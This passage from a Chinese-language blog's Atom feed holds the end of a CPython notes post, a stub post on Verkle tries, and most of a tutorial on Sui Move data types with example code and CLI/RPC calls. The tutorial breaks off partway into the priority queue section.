href="https://www.python.org/community/lists/">python-ideas 邮件列表</a>建议对核心开发组之外的语言进行更改。</p><p>你可以在 <a href="https://www.python.org/dev/peps/">PEP 索引</a>中查看 CPython 未来版本的起草的、拒绝的和接受的 PEP。一旦 PEP 达成共识，并且草案已定稿，指导委员会必须接受或拒绝它。<a href="https://www.python.org/dev/peps/pep-0013/">PEP 13</a> 中定义的指导委员会的任务规定，他们应努力“维护 Python 语言和 CPython 解释器的质量和稳定性”。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CPython Internals 笔记 ── Python 语言和语法
    
    </summary>
    
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="读书笔记" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="CPythonInternals" scheme="https://qiwihui.com/tags/CPythonInternals/"/>
    
  </entry>
  
  <entry>
    <title>Verkle Trie 从 0 到 1</title>
    <link href="https://qiwihui.com/qiwihui-blog-175/"/>
    <id>https://qiwihui.com/qiwihui-blog-175/</id>
    <published>2024-05-15T02:25:31.305Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>video: TODO</p><p>docs: <a href="https://qiwihui.notion.site/Verkle-trie-8fa545dff5014191bfb6af2765b42e6e?pvs=4">https://qiwihui.notion.site/Verkle-trie-8fa545dff5014191bfb6af2765b42e6e?pvs=4</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Verkle Trie 从 0 到 1
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Sui 数据类型讲解</title>
    <link href="https://qiwihui.com/qiwihui-blog-172/"/>
    <id>https://qiwihui.com/qiwihui-blog-172/</id>
    <published>2024-05-15T02:25:31.302Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章中，我们将介绍 Sui 中常见的数据结构，这些结构包含 Sui Move 和 Sui Framework 中提供的基础类型和数据结构，理解和熟悉这些数据结构对于 Sui Move 的理解和应用大有裨益。</p><p>首先，我们先快速复习一下 Sui Move 中使用到的基础类型。</p><h3><span id="wu-fu-hao-zheng-xing-integer">无符号整型（Integer）</span></h3><p>Move 包含六种无符号整型：<code>u8</code>，<code>u16</code> <code>u32</code>，<code>u64</code>，<code>u128</code>和 <code>u256</code>。值的范围从 0 到 与类型大小相关的最大值。</p><p>这些类型的字面值为数字序列（例如 112）或十六进制文字，例如 <code>0xFF</code>。 字面值的类型可以选择添加为后缀，例如 <code>112u8</code>。 如果未指定类型，编译器将尝试从使用文字的上下文中推断类型。 如果无法推断类型，则假定为 <code>u64</code>。</p><p>对无符号整型支持的运算包括：</p><ul><li>算数运算： <code>+</code> <code>-</code>  <code>*</code>  <code>%</code> <code>/</code></li><li>位运算： <code>&amp;</code> <code>|</code> <code>^</code>  <code>&gt;&gt;</code> <code>&lt;&lt;</code></li><li>比较运算： <code>&gt;</code> <code>&lt;</code> <code>&gt;=</code> <code>&lt;=</code>  <code>==</code> <code>!=</code></li><li>类型转换： <code>as</code><ul><li>注意，类型转换不会截断，因此如果结果对于指定类型而言太大，转换将中止。</li></ul></li></ul><p>简单示例：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span>: <span class="type">u64</span> = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">b</span> = <span class="number">2u64</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">hex_u64</span>: <span class="type">u64</span> = <span class="number">0xCAFE</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">assert!</span>(a+b==<span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">assert!</span>(a-b==<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">assert!</span>(a*b==<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">assert!</span>(a/b==<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">complex_u8</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">_unused</span> = <span class="number">10</span> &lt;&lt; complex_u8;</span><br><span class="line"></span><br><span class="line">(b <span class="keyword">as</span> <span class="type">u128</span>)</span><br></pre></td></tr></table></figure><h3><span id="bu-er-lei-xing-bool">布尔类型（Bool）</span></h3><p>Move 布尔值包含两种，<code>true</code> 和 <code>false</code> 。支持与 <code>&amp;&amp;</code>，或<code>||</code>  和非 <code>!</code> 运算。可以用于 Move 的控制流和 <code>assert!</code> 中。 <code>assert!</code> 是 Move 提供的用于断言，当判断的值是 <code>false</code> 时，程序会抛出错误并停止。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="type">bool</span>) &#123; ... &#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="type">bool</span>) &#123; .. &#125;</span><br><span class="line"><span class="built_in">assert!</span>(<span class="type">bool</span>, <span class="type">u64</span>)</span><br></pre></td></tr></table></figure><h3><span id="di-zhi-address">地址（Address）</span></h3><p>address 也是 Move 的原生类型，可以在地址下保存模块和资源。Sui 中地址的长度为 20 字节。</p><p>在表达式中，地址需要使用前缀 <code>@</code> ，例如：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a1</span>: address = @<span class="number">0xDEADBEEF</span>; <span class="comment">// shorthand for 0x00000000000000000000000000000000DEADBEEF</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a2</span>: address = @<span class="number">0x0000000000000000000000000000000000000002</span>;</span><br></pre></td></tr></table></figure><h3><span id="tuples-he-unit">Tuples 和 Unit</span></h3><p>Tuples 和 Unit <code>()</code> 在 Move 中主要用作函数返回值。只支持解构（destructuring）运算。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::tuples &#123;</span><br><span class="line">    <span class="comment">// all 3 of these functions are equivalent</span></span><br><span class="line">    fun <span class="title function_ invoke__">returns_unit</span>() &#123;&#125;</span><br><span class="line">    fun <span class="title function_ invoke__">returns_2_values</span>(): (<span class="type">bool</span>, <span class="type">bool</span>) &#123; (<span class="literal">true</span>, <span class="literal">false</span>) &#125;</span><br><span class="line">    fun <span class="title function_ invoke__">returns_4_values</span>(x: &amp;<span class="type">u64</span>): (&amp;<span class="type">u64</span>, <span class="type">u8</span>, <span class="type">u128</span>, vector&lt;<span class="type">u8</span>&gt;) &#123; (x, <span class="number">0</span>, <span class="number">1</span>, <span class="string">b&quot;foobar&quot;</span>) &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">examples</span>(cond: <span class="type">bool</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> () = ();</span><br><span class="line">        <span class="keyword">let</span> (x, y): (<span class="type">u8</span>, <span class="type">u64</span>) = (<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> (a, b, c, d) = (@<span class="number">0x0</span>, <span class="number">0</span>, <span class="literal">false</span>, <span class="string">b&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        () = ();</span><br><span class="line">        (x, y) = <span class="keyword">if</span> (cond) (<span class="number">1</span>, <span class="number">2</span>) <span class="keyword">else</span> (<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">        (a, b, c, d) = (@<span class="number">0x1</span>, <span class="number">1</span>, <span class="literal">true</span>, <span class="string">b&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">examples_with_function_calls</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> () = <span class="title function_ invoke__">returns_unit</span>();</span><br><span class="line">        <span class="keyword">let</span> (x, y): (<span class="type">bool</span>, <span class="type">bool</span>) = <span class="title function_ invoke__">returns_2_values</span>();</span><br><span class="line">        <span class="keyword">let</span> (a, b, c, d) = <span class="title function_ invoke__">returns_4_values</span>(&amp;<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        () = <span class="title function_ invoke__">returns_unit</span>();</span><br><span class="line">        (x, y) = <span class="title function_ invoke__">returns_2_values</span>();</span><br><span class="line">        (a, b, c, d) = <span class="title function_ invoke__">returns_4_values</span>(&amp;<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，我们从 Vector 开始，介绍 Sui 和 Sui Framework 中支持的集合类型。</p><h3><span id="shu-zu-vector">数组（Vector）</span></h3><p><code>vector&lt;T&gt;</code> 是 Move 提供的唯一的原生集合类型。<code>vector&lt;T&gt;</code> 是由一组相同类型的值组成的数组，比如 <code>vector&lt;u64&gt;</code>， <code>vector&lt;address&gt;</code> 等。</p><p><code>vector</code> 支持的主要操作有：</p><ul><li>末尾添加元素：<code>push_back</code></li><li>末尾删除元素： <code>pop_back</code></li><li>读取或者修改： <code>borrow</code> ，<code>borrow_mut</code></li><li>判断是否包含： <code>contains</code></li><li>交换元素： <code>swap</code></li><li>读取元素索引： <code>index_of</code></li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::vectors &#123;</span><br><span class="line">    <span class="keyword">use</span> std::vector;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">v</span> = vector::empty&lt;<span class="type">u64</span>&gt;();</span><br><span class="line">        vector::<span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> v, <span class="number">5</span>);</span><br><span class="line">        vector::<span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> v, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(vector::<span class="title function_ invoke__">contains</span>(&amp;<span class="keyword">mut</span> v, &amp;<span class="number">5</span>), <span class="number">42</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> (exists, index) = vector::<span class="title function_ invoke__">index_of</span>(&amp;<span class="keyword">mut</span> v, &amp;<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(exists, <span class="number">42</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(index == <span class="number">0</span>, <span class="number">42</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;v, <span class="number">0</span>) == <span class="number">5</span>, <span class="number">42</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;v, <span class="number">1</span>) == <span class="number">6</span>, <span class="number">42</span>);</span><br><span class="line"></span><br><span class="line">        vector::<span class="title function_ invoke__">swap</span>(&amp;<span class="keyword">mut</span> v, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(vector::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> v) == <span class="number">5</span>, <span class="number">42</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(vector::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> v) == <span class="number">6</span>, <span class="number">42</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并运行示例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译并发布</span></span><br><span class="line">sui client publish . --gas-budget 300000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取上一步编译得到的包的ID</span></span><br><span class="line"><span class="built_in">export</span> package_id=0xee2961ee26916285ebef57c68caaa5f67a3d8dbd</span><br><span class="line"></span><br><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> example \</span><br><span class="line">  --module vectors \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --gas-budget 30000</span><br></pre></td></tr></table></figure><p>下面我们介绍几种基于 <code>vector</code>  的数据类型。</p><h3><span id="zi-fu-chuan-string">字符串（String）</span></h3><p>Move 没有字符串的原生类型，但它使用 <code>vector&lt;u8&gt;</code> 表示字节数组。目前， <code>vector&lt;u8&gt;</code> 字面量有两种：字节字符串（byte strings）和十六进制字符串（hex strings）。</p><p>字节字符串是以 <code>b</code> 为前缀的字符串文字，例如 <code>b&quot;Hello!\n&quot;</code>。</p><p>十六进制字符串是以 <code>x</code> 为前缀的字符串文字，例如 <code>x&quot;48656C6C6F210A&quot;</code> 。每一对字节的范围从 <code>00</code> 到 <code>FF</code>，表示一个十六进制的 <code>u8</code>。因此我们可以知道： <code>b&quot;Hello&quot; == x&quot;48656C6C6F&quot;</code>。</p><p>在 <code>vector&lt;u8&gt;</code> 的基础上，Move 提供了 <code>string</code> 包处理 UTF8 字符串的操作。</p><p>我们以创建 Name NFT 的为例：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::strings &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;sender, TxContext&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 std::string 作为 UTF-8 字符串</span></span><br><span class="line">    <span class="keyword">use</span> std::string::&#123;<span class="keyword">Self</span>, <span class="type">String</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 保存 String 类型</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Name</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/// String 类型</span></span><br><span class="line">        name: <span class="type">String</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">create_name</span>(</span><br><span class="line">        name_bytes: vector&lt;<span class="type">u8</span>&gt;, ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ): Name &#123;</span><br><span class="line">        Name &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">new</span>(ctx),</span><br><span class="line">            name: string::<span class="title function_ invoke__">utf8</span>(name_bytes)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 传入原始字节（raw bytes）来创建</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">issue_name_nft</span>(</span><br><span class="line">        name_bytes: vector&lt;<span class="type">u8</span>&gt;, ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(</span><br><span class="line">            <span class="title function_ invoke__">create_name</span>(name_bytes, ctx),</span><br><span class="line">            <span class="title function_ invoke__">sender</span>(ctx)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后命令行中调用：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sui client call \</span><br><span class="line">  --<span class="keyword">function</span> issue_name_nft \</span><br><span class="line">  --module strings \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args <span class="string">&quot;my_nft&quot;</span> --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部分输出结果</span></span><br><span class="line"></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0xf53891c8d200125bcfdba69557b158395bdf9390 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0xd1de857a7a5452a73c9c176cd7c9db1b06671723 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br></pre></td></tr></table></figure><p>可以在 Transaction Effects 中看到新创建的对象，ID 为 <code>0xf53891c8d200125bcfdba69557b158395bdf9390</code>，通过 Sui 提供的 RPC-API 接口 <code>sui_getObject</code> 可以看到其中保存的内容：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">curl -H &#x27;Content-Type<span class="punctuation">:</span> application/json&#x27; https<span class="punctuation">:</span><span class="comment">//fullnode.devnet.sui.io:443 -d &#x27;&#123;</span></span><br><span class="line">  <span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sui_getObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;0xf53891c8d200125bcfdba69557b158395bdf9390&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span>&#x27;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Exists&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;details&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;moveObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xee2961ee26916285ebef57c68caaa5f67a3d8dbd::strings::Name&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;has_public_transfer&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xf53891c8d200125bcfdba69557b158395bdf9390&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my_nft&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;owner&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AddressOwner&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;previousTransaction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7AfcBmJCioSbdZD6ZdYU2iUuGiSc62AuhZn7Yi3TfLDa&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;storageRebate&quot;</span><span class="punctuation">:</span> <span class="number">13</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;reference&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;objectId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xf53891c8d200125bcfdba69557b158395bdf9390&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">1614</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/SEDlnh4xXq//ZGOCZVQM5QfyR2fPzJWaYWELhrSn2o=&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3><span id="vecmap-he-vecset">VecMap 和 VecSet</span></h3><p>Sui 在 <code>vector</code> 的基础上实现了两种数据结构，映射 <code>vec_map</code> 和集合 <code>vec_set</code> 。</p><p><code>vec_map</code> 是一种映射结构，保证不包含重复的键，但是条目按照插入顺序排列，而不是按键的顺序。所有的操作时间复杂度为 <code>0(N)</code>，N 为映射的大小。<code>vec_map</code> 只是为了提供方便的操作映射的接口，如果需要保存大型的映射，或者是需要按键的顺序排序的映射都需要另外处理。可以考虑使用之后介绍的 <code>table</code> 数据结构。</p><p>主要操作包括：</p><ul><li>创建空映射: <code>empty</code></li><li>插入键值对： <code>insert</code></li><li>获取键对应的值： <code>get</code>， <code>get_mut</code></li><li>删除键： <code>remove</code></li><li>判断是否包含键： <code>contains</code></li><li>映射大小： <code>size</code></li><li>将映射转为键值对的数组： <code>into_keys_values</code></li><li>获取映射键的数组： <code>keys</code></li><li>删除空映射： <code>destroy_empty</code></li><li>通过插入的顺序索引键值对： <code>get_entry_by_idx</code>，<code>get_entry_by_idx_mut</code></li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::v_map &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::vec_map;</span><br><span class="line">    <span class="keyword">use</span> std::vector;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">m</span> = vec_map::<span class="title function_ invoke__">empty</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">v</span> = i + <span class="number">5</span>;</span><br><span class="line">            vec_map::<span class="title function_ invoke__">insert</span>(&amp;<span class="keyword">mut</span> m, k, v);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">assert!</span>(!vec_map::<span class="title function_ invoke__">is_empty</span>(&amp;m), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(vec_map::<span class="title function_ invoke__">size</span>(&amp;m) == <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// make sure the elements are as expected in all of the getter APIs we expose</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            <span class="built_in">assert!</span>(vec_map::<span class="title function_ invoke__">contains</span>(&amp;m, &amp;k), <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">v</span> = *vec_map::<span class="title function_ invoke__">get</span>(&amp;m, &amp;k);</span><br><span class="line">            <span class="built_in">assert!</span>(v == i + <span class="number">5</span>, <span class="number">3</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(vec_map::<span class="title function_ invoke__">get_idx</span>(&amp;m, &amp;k) == i, <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">let</span> (other_k, other_v) = vec_map::<span class="title function_ invoke__">get_entry_by_idx</span>(&amp;m, i);</span><br><span class="line">            <span class="built_in">assert!</span>(*other_k == k, <span class="number">5</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(*other_v == v, <span class="number">6</span>);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 移出所有元素</span></span><br><span class="line">        <span class="keyword">let</span> (keys, values) = vec_map::<span class="title function_ invoke__">into_keys_values</span>(copy m);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">let</span> (other_k, v) = vec_map::<span class="title function_ invoke__">remove</span>(&amp;<span class="keyword">mut</span> m, &amp;k);</span><br><span class="line">            <span class="built_in">assert!</span>(k == other_k, <span class="number">7</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(v == i + <span class="number">5</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;keys, i) == k, <span class="number">9</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;values, i) == v, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vec_set</code> 结构保证其中不包含重复的键。所有的操作时间复杂度为 <code>O(N)</code>，N 为映射的大小。同样， <code>vec_set</code> 提供了方便的集合操作接口，按插入顺序进行排序，如果需要使用按键进行排序的集合，也需要另外处理。</p><p>主要操作包括：</p><ul><li>创建空集合: <code>empty</code></li><li>插入元素： <code>insert</code></li><li>删除元素： <code>remove</code></li><li>判断是否包含元素： <code>contains</code></li><li>集合大小： <code>size</code></li><li>将集合转为元素的数组： <code>into_keys</code></li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::v_set &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::vec_set;</span><br><span class="line">    <span class="keyword">use</span> std::vector;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">m</span> = vec_set::<span class="title function_ invoke__">empty</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            vec_set::<span class="title function_ invoke__">insert</span>(&amp;<span class="keyword">mut</span> m, k);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">assert!</span>(!vec_set::<span class="title function_ invoke__">is_empty</span>(&amp;m), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(vec_set::<span class="title function_ invoke__">size</span>(&amp;m) == <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// make sure the elements are as expected in all of the getter APIs we expose</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            <span class="built_in">assert!</span>(vec_set::<span class="title function_ invoke__">contains</span>(&amp;m, &amp;k), <span class="number">2</span>);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 移出所有元素</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">keys</span> = vec_set::<span class="title function_ invoke__">into_keys</span>(copy m);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            vec_set::<span class="title function_ invoke__">remove</span>(&amp;<span class="keyword">mut</span> m, &amp;k);</span><br><span class="line">            <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;keys, i) == k, <span class="number">9</span>);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="you-xian-dui-lie-priorityqueue">优先队列（PriorityQueue）</span></h3><p>还有一种基于 <code>vector</code> 构建的数据结构：优先队列，他使用基于 <code>vector</code> 实现的大顶堆（max 